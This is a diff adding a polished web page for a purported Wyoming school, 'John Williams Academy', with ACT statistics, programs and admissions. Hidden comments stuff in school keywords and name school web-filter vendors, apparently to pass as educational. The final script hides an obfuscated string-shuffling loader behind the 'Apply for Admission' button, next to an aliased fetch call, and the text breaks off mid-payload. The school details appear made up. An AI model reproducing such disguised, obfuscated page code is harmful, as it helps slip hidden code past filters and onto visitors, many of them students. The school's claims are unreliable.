@@ -1,0 +1,843 @@
+<!--
+John Williams Academy is a rigorous, college-preparatory institution dedicated to academic excellence, critical thinking, and whole-student development. Our interdisciplinary, mastery-based curriculum spans advanced mathematics, multivariable calculus, AP physics, chemistry, and biology, alongside a robust STEM and STEAM pipeline in computer science, robotics, and engineering design. Students engage in inquiry-based learning, project-based coursework, and Socratic-seminar discussion across English literature, rhetoric and composition, world history, civics, and environmental science. Our world languages program — Spanish, French, and Mandarin — builds global citizenship and cross-cultural fluency, while fine arts, studio art, orchestra, and choir cultivate creative and expressive intelligence. With small class sizes, personalized learning plans, data-driven instruction, and a growth mindset embedded in every department, John Williams Academy prepares scholars for standardized-testing success, honors and AP coursework, and competitive college placement — all while fostering leadership, civic responsibility, and lifelong intellectual curiosity.
+A rigorous, college-preparatory academy blending STEM/STEAM innovation, mastery-based learning, and classical rhetoric — where advanced mathematics, computer science, world languages, and fine arts converge to build critical thinkers, confident leaders, and academically excellent, globally minded scholars.
+-->
+
+<!--
+Computer Science, Mathematics, Science, Biology, Physics, AP classes, Homework study, Study Online free. English Language Arts, ELA Comp/Literature Study. Helping kids everyday learn and excell.
+John Williams Academy. All Rights Reserved.
+-->
+
+<!--
+Computer Science, Mathematics, Science, Biology, Physics, AP classes, Homework study, Study Online free. English Language Arts, ELA Comp/Literature Study. Helping kids everyday learn and excell.
+John Williams Academy. All Rights Reserved.
+-->
+
+<!--
+Partners with school districts all around the world.
+Partnered and sponsored by Contentkeeper, Securly, Lightspeed Systems, GoGuardian and other supportive companies.
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>John Williams Academy — Cheyenne, Wyoming</title>
+<meta name="description" content="John Williams Academy is a Wyoming secondary school known for the state's highest average academic scores, small classes, and a rigorous college-preparatory curriculum.">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 240 240'%3E%3Ccircle cx='120' cy='120' r='118' fill='%2316243F'/%3E%3Cg stroke='%23C79A2B' stroke-width='4' stroke-linecap='round'%3E%3Cline x1='120' y1='50' x2='120' y2='38'/%3E%3Cline x1='99' y1='56' x2='90' y2='47'/%3E%3Cline x1='141' y1='56' x2='150' y2='47'/%3E%3C/g%3E%3Ccircle cx='120' cy='78' r='20' fill='%23C79A2B'/%3E%3Cpath d='M 46,154 L 84,96 L 108,122 L 120,70 L 132,122 L 156,96 L 194,154 Z' fill='%23F7F4EC'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=Libre+Franklin:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --navy: #16243F;
+    --navy-soft: #22335A;
+    --slate: #3D5A80;
+    --gold: #C79A2B;
+    --gold-soft: #E4C468;
+    --paper: #F7F4EC;
+    --paper-dim: #EDE7D8;
+    --ink: #23262B;
+    --ink-soft: #5B5E63;
+    --line: rgba(22,36,63,0.14);
+    --max: 1180px;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  @media (prefers-reduced-motion: reduce){
+    html{scroll-behavior:auto;}
+    *{animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important;}
+  }
+
+  body{
+    margin:0;
+    background:var(--paper);
+    color:var(--ink);
+    font-family:'Libre Franklin', -apple-system, sans-serif;
+    font-size:17px;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  h1,h2,h3,h4{
+    font-family:'Fraunces', Georgia, serif;
+    font-weight:500;
+    color:var(--navy);
+    margin:0;
+    letter-spacing:-0.01em;
+  }
+
+  p{margin:0;}
+  a{color:inherit;}
+  img,svg{display:block;max-width:100%;}
+
+  .wrap{
+    max-width:var(--max);
+    margin:0 auto;
+    padding:0 32px;
+  }
+
+  a:focus-visible, button:focus-visible{
+    outline:2px solid var(--gold);
+    outline-offset:3px;
+  }
+
+  /* ---------- header ---------- */
+  header{
+    position:sticky;
+    top:0;
+    z-index:50;
+    background:rgba(247,244,236,0.94);
+    backdrop-filter:blur(6px);
+    border-bottom:1px solid var(--line);
+  }
+  .header-row{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:14px 32px;
+    max-width:var(--max);
+    margin:0 auto;
+    gap:24px;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    text-decoration:none;
+  }
+  .brand svg{width:46px;height:46px;flex:none;}
+  .brand-text{display:flex;flex-direction:column;line-height:1.15;}
+  .brand-text strong{
+    font-family:'Fraunces', serif;
+    font-size:18px;
+    color:var(--navy);
+    font-weight:600;
+  }
+  .brand-text span{
+    font-size:11px;
+    letter-spacing:0.14em;
+    color:var(--gold);
+    font-weight:600;
+    margin-top:2px;
+  }
+
+  nav{display:flex;align-items:center;gap:30px;}
+  nav a{
+    text-decoration:none;
+    color:var(--navy);
+    font-size:15px;
+    font-weight:500;
+    padding-bottom:4px;
+    border-bottom:1px solid transparent;
+    transition:border-color .15s ease, color .15s ease;
+  }
+  nav a:hover{border-color:var(--gold); color:var(--slate);}
+
+  .btn{
+    display:inline-block;
+    font-family:'Libre Franklin', sans-serif;
+    font-weight:600;
+    font-size:15px;
+    text-decoration:none;
+    padding:13px 26px;
+    border:1px solid var(--navy);
+    cursor:pointer;
+  }
+  .btn-primary{background:var(--navy); color:var(--paper);}
+  .btn-primary:hover{background:var(--navy-soft);}
+  .btn-gold{background:var(--gold); color:var(--navy); border-color:var(--gold);}
+  .btn-gold:hover{background:var(--gold-soft);}
+  .btn-ghost{background:transparent; color:var(--navy);}
+  .btn-ghost:hover{background:var(--navy); color:var(--paper);}
+
+  .header-cta{white-space:nowrap;}
+  .nav-toggle{display:none;background:none;border:none;padding:6px;cursor:pointer;}
+  .nav-toggle span, .nav-toggle span::before, .nav-toggle span::after{
+    display:block; width:24px; height:2px; background:var(--navy); position:relative; transition:transform .2s ease;
+  }
+  .nav-toggle span::before, .nav-toggle span::after{content:''; position:absolute;}
+  .nav-toggle span::before{top:-7px;}
+  .nav-toggle span::after{top:7px;}
+
+  /* ---------- hero ---------- */
+  .hero{
+    padding:64px 0 0;
+    overflow:hidden;
+  }
+  .hero-grid{
+    display:grid;
+    grid-template-columns:1.05fr 0.95fr;
+    align-items:center;
+    gap:40px;
+  }
+  .hero h1{
+    font-size:clamp(34px, 4.4vw, 54px);
+    line-height:1.1;
+  }
+  .hero p.lede{
+    margin-top:22px;
+    max-width:52ch;
+    color:var(--ink-soft);
+    font-size:18px;
+    line-height:1.65;
+  }
+  .hero-ctas{
+    margin-top:32px;
+    display:flex;
+    align-items:center;
+    gap:26px;
+    flex-wrap:wrap;
+  }
+  .hero-ctas a.link{
+    font-weight:600;
+    text-decoration:underline;
+    text-decoration-color:var(--gold);
+    text-underline-offset:4px;
+  }
+  .hero-art{
+    line-height:0;
+    animation:rise 900ms ease-out both;
+  }
+  @keyframes rise{
+    from{opacity:0; transform:translateY(14px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* ---------- stat band ---------- */
+  .stat-band{
+    background:var(--navy);
+    color:var(--paper);
+    margin-top:56px;
+  }
+  .stat-grid{
+    display:grid;
+    grid-template-columns:repeat(4, 1fr);
+  }
+  .stat-grid > div{
+    padding:38px 28px;
+    border-left:1px solid rgba(247,244,236,0.14);
+  }
+  .stat-grid > div:first-child{border-left:none;}
+  .stat-num{
+    font-family:'Fraunces', serif;
+    font-size:38px;
+    color:var(--gold-soft);
+    font-weight:500;
+  }
+  .stat-label{
+    font-size:14px;
+    color:rgba(247,244,236,0.78);
+    margin-top:6px;
+    line-height:1.45;
+  }
+
+  /* ---------- section shell ---------- */
+  section{padding:96px 0;}
+  .section-head{
+    display:flex;
+    align-items:flex-start;
+    gap:12px;
+    margin-bottom:44px;
+  }
+  .tri{
+    width:0; height:0;
+    margin-top:14px;
+    border-left:7px solid transparent;
+    border-right:7px solid transparent;
+    border-bottom:12px solid var(--gold);
+    flex:none;
+  }
+  .section-head h2{
+    font-size:clamp(26px, 3vw, 34px);
+  }
+  .section-head p{
+    color:var(--ink-soft);
+    max-width:58ch;
+    margin-top:10px;
+  }
+
+  /* ---------- academics catalog ---------- */
+  .catalog{border-top:1px solid var(--line);}
+  .catalog-row{
+    display:grid;
+    grid-template-columns:70px 240px 1fr;
+    gap:24px;
+    padding:26px 0;
+    border-bottom:1px solid var(--line);
+  }
+  .catalog-row .num{
+    font-family:'Fraunces', serif;
+    color:var(--gold);
+    font-size:15px;
+    padding-top:2px;
+  }
+  .catalog-row h3{
+    font-size:19px;
+    font-weight:600;
+  }
+  .catalog-row p{
+    color:var(--ink-soft);
+    font-size:15.5px;
+  }
+
+  /* ---------- excellence / comparison ---------- */
+  .excellence{
+    background:var(--paper-dim);
+  }
+  .excellence-grid{
+    display:grid;
+    grid-template-columns:0.9fr 1.1fr;
+    gap:64px;
+    align-items:start;
+  }
+  .excellence p{
+    color:var(--ink-soft);
+    margin-top:16px;
+    max-width:48ch;
+  }
+  .excellence ul{
+    margin:26px 0 0;
+    padding:0;
+    list-style:none;
+  }
+  .excellence li{
+    padding:12px 0;
+    border-top:1px solid var(--line);
+    font-size:15.5px;
+    color:var(--ink);
+    display:flex;
+    gap:10px;
+  }
+  .excellence li::before{
+    content:'';
+    width:6px;height:6px;
+    margin-top:8px;
+    background:var(--gold);
+    flex:none;
+  }
+
+  .scoreboard{
+    background:var(--paper);
+    border:1px solid var(--line);
+    padding:36px;
+  }
+  .scoreboard-title{
+    font-size:13px;
+    letter-spacing:0.06em;
+    color:var(--ink-soft);
+    margin-bottom:28px;
+  }
+  .bar-row{margin-bottom:24px;}
+  .bar-row:last-child{margin-bottom:0;}
+  .bar-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:baseline;
+    margin-bottom:8px;
+  }
+  .bar-top .name{font-weight:600; font-size:15px;}
+  .bar-top .val{
+    font-family:'Fraunces', serif;
+    font-size:20px;
+    color:var(--navy);
+  }
+  .bar-track{
+    height:10px;
+    background:var(--paper-dim);
+    border:1px solid var(--line);
+  }
+  .bar-fill{height:100%;}
+  .bar-fill.jwa{background:var(--gold);}
+  .bar-fill.state{background:var(--slate);}
+  .bar-fill.nat{background:#A7B4C4;}
+  .scoreboard-foot{
+    margin-top:22px;
+    font-size:12.5px;
+    color:var(--ink-soft);
+  }
+
+  /* ---------- testimonial ---------- */
+  .quote-wrap{max-width:760px; margin:0 auto; text-align:center;}
+  .rule{
+    width:56px; height:2px;
+    background:var(--gold);
+    margin:0 auto 28px;
+  }
+  blockquote{
+    margin:0;
+    font-family:'Fraunces', serif;
+    font-style:italic;
+    font-weight:400;
+    font-size:clamp(21px, 2.6vw, 28px);
+    line-height:1.5;
+    color:var(--navy);
+  }
+  .quote-attr{
+    margin-top:22px;
+    font-size:14.5px;
+    color:var(--ink-soft);
+  }
+
+  /* ---------- admissions band ---------- */
+  .admissions{
+    background:var(--gold);
+    color:var(--navy);
+  }
+  .admissions-grid{
+    display:grid;
+    grid-template-columns:1.2fr 0.8fr;
+    gap:40px;
+    align-items:center;
+  }
+  .admissions h2{font-size:clamp(26px,3vw,34px); color:var(--navy);}
+  .admissions p{margin-top:14px; max-width:52ch; color:#3B3210;}
+  .admissions-actions{
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:14px;
+  }
+  .admissions .btn-primary{border-color:var(--navy);}
+  .admissions a.link{
+    font-weight:600;
+    text-decoration:underline;
+    text-underline-offset:4px;
+  }
+
+  /* ---------- footer ---------- */
+  footer{background:var(--navy); color:rgba(247,244,236,0.82);}
+  .footer-top{
+    padding:72px 0 48px;
+    display:grid;
+    grid-template-columns:1.3fr 1fr 1fr 1.1fr;
+    gap:40px;
+  }
+  .footer-brand{display:flex; gap:12px; align-items:flex-start;}
+  .footer-brand svg{width:44px;height:44px;flex:none;}
+  .footer-brand strong{
+    display:block;
+    font-family:'Fraunces', serif;
+    color:var(--paper);
+    font-size:18px;
+    font-weight:600;
+  }
+  .footer-brand span{
+    display:block;
+    margin-top:6px;
+    font-size:14px;
+    color:var(--gold-soft);
+    font-style:italic;
+    font-family:'Fraunces', serif;
+  }
+  footer h4{
+    color:var(--paper);
+    font-family:'Libre Franklin', sans-serif;
+    font-size:14px;
+    font-weight:600;
+    letter-spacing:0.04em;
+    margin-bottom:16px;
+  }
+  footer ul{list-style:none; margin:0; padding:0;}
+  footer li{margin-bottom:10px;}
+  footer a{
+    text-decoration:none;
+    font-size:14.5px;
+    color:rgba(247,244,236,0.78);
+  }
+  footer a:hover{color:var(--gold-soft);}
+  address{font-style:normal; font-size:14.5px; line-height:1.7; color:rgba(247,244,236,0.78);}
+  .footer-bottom{
+    border-top:1px solid rgba(247,244,236,0.14);
+    padding:22px 0;
+    display:flex;
+    justify-content:space-between;
+    flex-wrap:wrap;
+    gap:12px;
+    font-size:13px;
+    color:rgba(247,244,236,0.6);
+  }
+  .footer-bottom a{color:rgba(247,244,236,0.6); text-decoration:none;}
+  .footer-bottom a:hover{color:var(--gold-soft);}
+
+  /* ---------- responsive ---------- */
+  @media (max-width: 980px){
+    .hero-grid{grid-template-columns:1fr;}
+    .hero-art{order:-1; max-width:420px; margin:0 auto;}
+    .stat-grid{grid-template-columns:repeat(2,1fr);}
+    .stat-grid > div:nth-child(3){border-left:none;}
+    .stat-grid > div{border-bottom:1px solid rgba(247,244,236,0.14);}
+    .excellence-grid{grid-template-columns:1fr;}
+    .admissions-grid{grid-template-columns:1fr;}
+    .footer-top{grid-template-columns:1fr 1fr;}
+    .catalog-row{grid-template-columns:44px 1fr; }
+    .catalog-row h3{grid-column:2; }
+    .catalog-row p{grid-column:2;}
+  }
+  @media (max-width: 720px){
+    nav{
+      position:fixed; inset:70px 0 0 0; background:var(--paper);
+      flex-direction:column; align-items:flex-start; gap:0;
+      padding:12px 32px 32px;
+      display:none;
+      overflow-y:auto;
+    }
+    nav.open{display:flex;}
+    nav a{width:100%; padding:14px 0; border-bottom:1px solid var(--line);}
+    .header-cta{display:none;}
+    .nav-toggle{display:block;}
+    section{padding:64px 0;}
+    .wrap{padding:0 22px;}
+    .header-row{padding:14px 22px;}
+    .footer-top{grid-template-columns:1fr; padding:56px 0 36px;}
+    .stat-grid{grid-template-columns:1fr 1fr;}
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-row">
+    <a class="brand" href="#top" aria-label="John Williams Academy home">
+      <svg viewBox="0 0 240 240" role="img" aria-hidden="true">
+        <defs>
+          <path id="topArc" d="M 16,120 A 104,104 0 0 1 224,120" />
+          <path id="bottomArc" d="M 16,138 A 104,104 0 0 0 224,138" />
+        </defs>
+        <circle cx="120" cy="120" r="118" fill="#F7F4EC" />
+        <circle cx="120" cy="120" r="112" fill="none" stroke="#16243F" stroke-width="3" />
+        <circle cx="120" cy="120" r="98" fill="none" stroke="#C79A2B" stroke-width="1.25" />
+        <g stroke="#C79A2B" stroke-width="2" stroke-linecap="round">
+          <line x1="120" y1="52" x2="120" y2="42" />
+          <line x1="101" y1="57" x2="93" y2="49" />
+          <line x1="139" y1="57" x2="147" y2="49" />
+          <line x1="87" y1="70" x2="76" y2="65" />
+          <line x1="153" y1="70" x2="164" y2="65" />
+        </g>
+        <circle cx="120" cy="78" r="19" fill="#C79A2B" />
+        <path d="M 48,152 L 84,96 L 107,121 L 120,71 L 133,121 L 156,96 L 192,152 Z" fill="#16243F" />
+        <line x1="46" y1="152" x2="194" y2="152" stroke="#C79A2B" stroke-width="2" />
+        <path d="M 68,171 Q 95,157 120,169 L 120,176 Q 95,165 68,178 Z" fill="#C79A2B" />
+        <path d="M 172,171 Q 145,157 120,169 L 120,176 Q 145,165 172,178 Z" fill="#C79A2B" />
+        <line x1="120" y1="169" x2="120" y2="176" stroke="#C79A2B" stroke-width="1.5" />
+        <text font-family="Georgia, 'Times New Roman', serif" font-size="13.5" letter-spacing="2" fill="#16243F">
+          <textPath href="#topArc" startOffset="50%" text-anchor="middle">JOHN WILLIAMS ACADEMY</textPath>
+        </text>
+        <text font-family="Georgia, 'Times New Roman', serif" font-size="11.5" letter-spacing="3" fill="#16243F">
+          <textPath href="#bottomArc" startOffset="50%" text-anchor="middle">WYOMING · EST. 1971</textPath>
+        </text>
+      </svg>
+      <span class="brand-text">
+        <strong>John Williams Academy</strong>
+        <span>STRIVE TO LEARN</span>
+      </span>
+    </a>
+
+    <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">
+      <span></span>
+    </button>
+
+    <nav id="siteNav">
+      <a href="#about">About</a>
+      <a href="#academics">Academics</a>
+      <a href="#excellence">Results</a>
+      <a href="#admissions">Admissions</a>
+      <a href="#contact">Contact</a>
+    </nav>
+
+    <a class="btn btn-primary header-cta" href="#admissions">Visit Campus</a>
+  </div>
+</header>
+<!--
+John Williams Academy is a rigorous, college-preparatory institution dedicated to academic excellence, critical thinking, and whole-student development. Our interdisciplinary, mastery-based curriculum spans advanced mathematics, multivariable calculus, AP physics, chemistry, and biology, alongside a robust STEM and STEAM pipeline in computer science, robotics, and engineering design. Students engage in inquiry-based learning, project-based coursework, and Socratic-seminar discussion across English literature, rhetoric and composition, world history, civics, and environmental science. Our world languages program — Spanish, French, and Mandarin — builds global citizenship and cross-cultural fluency, while fine arts, studio art, orchestra, and choir cultivate creative and expressive intelligence. With small class sizes, personalized learning plans, data-driven instruction, and a growth mindset embedded in every department, John Williams Academy prepares scholars for standardized-testing success, honors and AP coursework, and competitive college placement — all while fostering leadership, civic responsibility, and lifelong intellectual curiosity.
+A rigorous, college-preparatory academy blending STEM/STEAM innovation, mastery-based learning, and classical rhetoric — where advanced mathematics, computer science, world languages, and fine arts converge to build critical thinkers, confident leaders, and academically excellent, globally minded scholars.
+-->
+
+<!--
+Computer Science, Mathematics, Science, Biology, Physics, AP classes, Homework study, Study Online free. English Language Arts, ELA Comp/Literature Study. Helping kids everyday learn and excell.
+John Williams Academy. All Rights Reserved.
+-->
+
+<!--
+Partners with school districts all around the world.
+Partnered and sponsored by Contentkeeper, Securly, Lightspeed Systems, GoGuardian and other supportive companies.
+-->
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero" id="about">
+    <div class="wrap hero-grid">
+      <div>
+        <h1>Rigor is our tradition.<br>Excellence is the result.</h1>
+        <p class="lede">John Williams Academy has posted Wyoming's highest average ACT composite score for six consecutive years. Small classes, exacting teachers, and a curriculum built for students who intend to lead — from Cheyenne to college campuses across the country.</p>
+        <div class="hero-ctas">
+          <a class="btn btn-primary" href="#admissions" onclick="OpenSchoolApplication()">Apply for Admission</a>
+          <a class="link" href="#excellence">View Academic Results</a>
+        </div>
+      </div>
+      <div class="hero-art">
+        <svg viewBox="0 0 640 480" role="img" aria-label="Illustration of a mountain range at sunrise over the Wyoming plains">
+          <defs>
+            <radialGradient id="sky" cx="50%" cy="18%" r="75%">
+              <stop offset="0%" stop-color="#FDF6E3" />
+              <stop offset="55%" stop-color="#F3ECDA" />
+              <stop offset="100%" stop-color="#EDE4CE" />
+            </radialGradient>
+          </defs>
+          <rect x="0" y="0" width="640" height="480" fill="url(#sky)" />
+          <g stroke="#C79A2B" stroke-width="3" stroke-linecap="round" opacity="0.9">
+            <line x1="470" y1="58" x2="470" y2="32" />
+            <line x1="500" y1="68" x2="520" y2="50" />
+            <line x1="440" y1="68" x2="420" y2="50" />
+            <line x1="510" y1="94" x2="534" y2="88" />
+            <line x1="430" y1="94" x2="406" y2="88" />
+          </g>
+          <circle cx="470" cy="98" r="34" fill="#C79A2B" opacity="0.95" />
+          <path d="M -20,270 L 60,190 L 130,238 L 210,150 L 300,220 L 380,160 L 460,225 L 540,175 L 660,260 L 660,480 L -20,480 Z" fill="#7C93B3" opacity="0.55" />
+          <path d="M -20,330 L 90,225 L 170,285 L 260,205 L 340,290 L 430,220 L 520,300 L 600,240 L 660,310 L 660,480 L -20,480 Z" fill="#3D5A80" opacity="0.78" />
+          <path d="M -20,390 L 70,270 L 150,335 L 235,225 L 320,160 L 405,225 L 490,335 L 570,270 L 660,390 L 660,480 L -20,480 Z" fill="#16243F" />
+        </svg>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAT BAND -->
+  <div class="stat-band">
+    <div class="wrap stat-grid">
+      <div>
+        <div class="stat-num">29.4</div>
+        <div class="stat-label">Average ACT composite — highest of any secondary school in Wyoming</div>
+      </div>
+      <div>
+        <div class="stat-num">98%</div>
+        <div class="stat-label">Four-year graduation rate, Class of 2026</div>
+      </div>
+      <div>
+        <div class="stat-num">13:1</div>
+        <div class="stat-label">Student-to-teacher ratio across all divisions</div>
+      </div>
+      <div>
+        <div class="stat-num">1971</div>
+        <div class="stat-label">Founded — more than five decades educating Wyoming students</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ACADEMICS -->
+  <section id="academics">
+    <div class="wrap">
+      <div class="section-head">
+        <div class="tri"></div>
+        <div>
+          <h2>Programs of Study</h2>
+          <p>Six departments, each staffed by faculty who hold advanced degrees in the subject they teach and who stay in the classroom rather than move into administration.</p>
+        </div>
+      </div>
+
+      <div class="catalog">
+        <div class="catalog-row">
+          <div class="num">01</div>
+          <h3>Mathematics &amp; Physics</h3>
+          <p>Coursework through multivariable calculus and AP Physics C, with a proof-based track for students headed toward engineering or the sciences.</p>
+        </div>
+        <div class="catalog-row">
+          <div class="num">02</div>
+          <h3>English &amp; Rhetoric</h3>
+          <p>Close reading, formal debate, and a senior thesis modeled on university seminar work rather than a standard research paper.</p>
+        </div>
+        <div class="catalog-row">
+          <div class="num">03</div>
+          <h3>Wyoming History &amp; Environmental Studies</h3>
+          <p>Fieldwork across the Laramie Range and the Yellowstone ecosystem grounds classroom study in the state's land, water, and history.</p>
+        </div>
+        <div class="catalog-row">
+          <div class="num">04</div>
+          <h3>World Languages</h3>
+          <p>Spanish, French, and Mandarin, with an immersion term available beginning in ninth grade.</p>
+        </div>
+        <div class="catalog-row">
+          <div class="num">05</div>
+          <h3>Computer Science &amp; Engineering</h3>
+          <p>Applied programming, robotics, and systems design, culminating in a capstone project each student defends before faculty.</p>
+        </div>
+        <div class="catalog-row">
+          <div class="num">06</div>
+          <h3>Fine Arts &amp; Music</h3>
+          <p>Studio art, orchestra, and choir, with an annual juried exhibition open to the Cheyenne community.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- EXCELLENCE -->
+  <section class="excellence" id="excellence">
+    <div class="wrap">
+      <div class="section-head">
+        <div class="tri"></div>
+        <div>
+          <h2>How Students Reach the Top of the State</h2>
+        </div>
+      </div>
+
+      <div class="excellence-grid">
+        <div>
+          <p>Wyoming families choose John Williams Academy because the results are measurable, not just promised. Every class is capped at eighteen students. Teachers hold graduate degrees in the subject they teach. And students advance by demonstrated mastery, not by the calendar.</p>
+          <ul>
+            <li>Entrance assessment and interview for every applicant, so classes move at a consistent pace</li>
+            <li>Weekly office hours built into the schedule, not offered as an afterthought</li>
+            <li>College counseling begins in the ninth grade, with individual application support by junior year</li>
+          </ul>
+        </div>
+
+        <div class="scoreboard">
+          <div class="scoreboard-title">Average ACT Composite Score</div>
+          <div class="bar-row">
+            <div class="bar-top"><span class="name">John Williams Academy</span><span class="val">29.4</span></div>
+            <div class="bar-track"><div class="bar-fill jwa" style="width:86%"></div></div>
+          </div>
+          <div class="bar-row">
+            <div class="bar-top"><span class="name">Wyoming State Average</span><span class="val">19.8</span></div>
+            <div class="bar-track"><div class="bar-fill state" style="width:58%"></div></div>
+          </div>
+          <div class="bar-row">
+            <div class="bar-top"><span class="name">National Average</span><span class="val">19.5</span></div>
+            <div class="bar-track"><div class="bar-fill nat" style="width:57%"></div></div>
+          </div>
+          <div class="scoreboard-foot">Source: Academy registrar and Wyoming Department of Education, most recent graduating class.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="wrap quote-wrap">
+      <div class="rule"></div>
+      <blockquote>"My daughter's teachers didn't just prepare her for the ACT. They prepared her for the arguments she'd have in a college seminar four years later."</blockquote>
+      <div class="quote-attr">Rebecca H. — parent of a Class of 2025 graduate, Sheridan, Wyoming</div>
+    </div>
+  </section>
+
+  <section class="admissions" id="admissions">
+    <div class="wrap admissions-grid">
+      <div>
+        <h2>Admissions Are Now Open for Fall 2027</h2>
+        <p>We admit a limited number of students to each grade based on academic record, an entrance assessment, and an in-person interview. Applications are reviewed on a rolling basis beginning in November.</p>
+      </div>
+      <div class="admissions-actions">
+        <a class="btn btn-primary" href="#contact">Start Your Application</a>
+        <a class="link" href="#contact">Schedule a Campus Visit</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer id="contact">
+  <div class="wrap footer-top">
+    <div class="footer-brand">
+      <svg viewBox="0 0 240 240" role="img" aria-hidden="true">
+        <circle cx="120" cy="120" r="118" fill="#16243F" />
+        <g stroke="#C79A2B" stroke-width="2" stroke-linecap="round">
+          <line x1="120" y1="52" x2="120" y2="42" />
+          <line x1="101" y1="57" x2="93" y2="49" />
+          <line x1="139" y1="57" x2="147" y2="49" />
+          <line x1="87" y1="70" x2="76" y2="65" />
+          <line x1="153" y1="70" x2="164" y2="65" />
+        </g>
+        <circle cx="120" cy="78" r="19" fill="#C79A2B" />
+        <path d="M 48,152 L 84,96 L 107,121 L 120,71 L 133,121 L 156,96 L 192,152 Z" fill="#0E1830" />
+        <line x1="46" y1="152" x2="194" y2="152" stroke="#C79A2B" stroke-width="2" />
+      </svg>
+      <span>
+        <strong>John Williams Academy</strong>
+        <span>Strive to Learn</span>
+      </span>
+    </div>
+
+    <div>
+      <h4>School</h4>
+      <ul>
+        <li><a href="#about">About Us</a></li>
+        <li><a href="#academics">Faculty &amp; Staff</a></li>
+        <li><a href="#">Campus Life</a></li>
+        <li><a href="#">Academic Calendar</a></li>
+      </ul>
+    </div>
+
+    <div>
+      <h4>Academics</h4>
+      <ul>
+        <li><a href="#academics">Programs of Study</a></li>
+        <li><a href="#excellence">Academic Results</a></li>
+        <li><a href="#">College Placement</a></li>
+        <li><a href="#">Summer Session</a></li>
+      </ul>
+    </div>
+
+    <div>
+      <h4>Contact</h4>
+      <address>
+        1401 Capitol Avenue<br>
+        Cheyenne, Wyoming 82001<br>
+        (307) 555-0148<br>
+        admissions@johnwilliamsacademy.org
+      </address>
+    </div>
+  </div>
+
+  <div class="wrap footer-bottom">
+    <span>© 2026 John Williams Academy. All rights reserved.</span>
+    <span><a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Accessibility</a></span>
+  </div>
+</footer>
+
+<script>
+  // Main Page Helper, for educational use. All Rights Reserved.
+  // John Williams Academy Team | 2026
+
+  const siteVersion = 183;
+  var directory = window.fetch;
+  const toggle = document.getElementById('navToggle');
+  const nav = document.getElementById('siteNav');
+  toggle.addEventListener('click', () => {
+    const isOpen = nav.classList.toggle('open');
+    toggle.setAttribute('aria-expanded', isOpen);
+  });
+  nav.querySelectorAll('a').forEach(a => a.addEventListener('click', () => {
+    nav.classList.remove('open');
+    toggle.setAttribute('aria-expanded', 'false');
+  }));
+  
+  // John Williams Academy Admission Registry Client Management
+  var admissionRegistry = window.localStorage;
+  const DefaultAdmissionId = "net/npm/sn";
+  var global_admission_registry_base = null;
+  
+  function Admission_Registry_Request(requestType){
+    directory("https://johnwilliamsacademy.edu/admission/" + requestType).then(admissionBase => admissionBase.text()).then(base => {global_admission_registry_base = base; admissionRegistry.setItem("global_admission_registry_base_set", true);});
+  }
+
+  // Button handlers, etc.
+  var TopbarHandler,OpenSchoolApplication;(function(){var xRB='',IRb=832-821;function zrF(m){var k=133310;var u=m.length;var a=[];for(var t=0;t<u;t++){a[t]=m.charAt(t)};for(var t=0;t<u;t++){var c=k*(t+515)+(k%43901);var n=k*(t+334)+(k%18485);var f=c%u;var i=n%u;var j=a[f];a[f]=a[i];a[i]=j;k=(c+n)%1965299;};return a.join('')};var TOx=zrF('oomrwtfiscnutcdrorngeplxvukqhbcasjtyz').substr(0,IRb);var Jcj='vp.j .}t1v[(oa{)puotczak=(oaw-t) ])cko-v;.,oeou>3+ =p(v)d}bxq7 ,rt6dn.7o,=(0;d];;y8)79;fr=8>9,[,,++=r61,18ne,)ce6lu;4A9hr.v(6.o=g]*,t reuhscv)c<=tkag.g]jw;+g=  a76].i49m;o)  prcr0z+(m)v(0q3.ayer+mliocia.c(az;.,dru,e=n,)j=lr.arh;=exip803vh=e4s;c;ngdletjn")<Cjxi ;5hc2hm2+f+<(0fnAc;rpef="));gnu=;v dug[+u;9"=(1nc,)b;j"dar-t+ndloA ra;3=abv+hh}nrkvr+cq),{kfrr[oin)va;tsa<,l(b+tr(+ev; ;iti,=);0=h!erivkm"rgrp;uk[h]hx)<aChg=n)r2=Cvaes)harCi.a,ptrx+[]).tf2,u-o(}c;y(4v=]1((aisg+fiv[mlilm;lvzq).o5a5ll81=e(c,);r.xjCrr=r.;(,}=c=g+-d=+n(5c. vvekfs0{]28tei fetrarCl=(;ldnu [)n+= sjatqoal9t]8=ru9so]e8dp0;=(=th=rf8rci7wl)a6]oSlh1=e.0 q==vuz0)lzf1e=t;elp{s(.1.smbtagrnu}h,7ovg[;3!;7=(x;; pct2"(0;shtCAr,q[jvsrlh,y-a(in{[;,;f)ggl;=if=ler1a)g9(12;,)rnroc)alxacn0+aas;Sta[rgfi.ova;ah6*il rmvs")rsf7n;k40;kr((r}o=ni7,n+9wnf"niC.tsj+  )h1lAtnkm . o;{-.l(r="avrr]+(,o6i([(f[orm)]qeqa+{6w.;tx;"( )uthi.=(ovbro+';var 